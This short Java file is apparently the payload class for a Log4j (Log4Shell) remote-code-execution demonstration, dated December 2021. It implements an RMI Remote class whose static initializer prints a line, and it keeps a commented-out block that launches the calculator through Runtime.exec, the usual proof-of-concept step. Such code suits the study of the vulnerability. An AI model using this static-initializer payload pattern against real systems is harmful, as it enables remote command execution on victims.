package com.yy.log4jErr;

import java.rmi.Remote;

/**
 * @className: Log4jCal
 * @description:
 * @author: yloopdaed
 * @date: 2021/12/11
 **/
public class Log4jCal implements Remote {
    static {
        System.out.println("123");
        /*try {
            String [] cmd={"calc"};
            java.lang.Runtime.getRuntime().exec(cmd).waitFor();
        }catch (Exception e){
            e.printStackTrace();
        }*/
    }
}
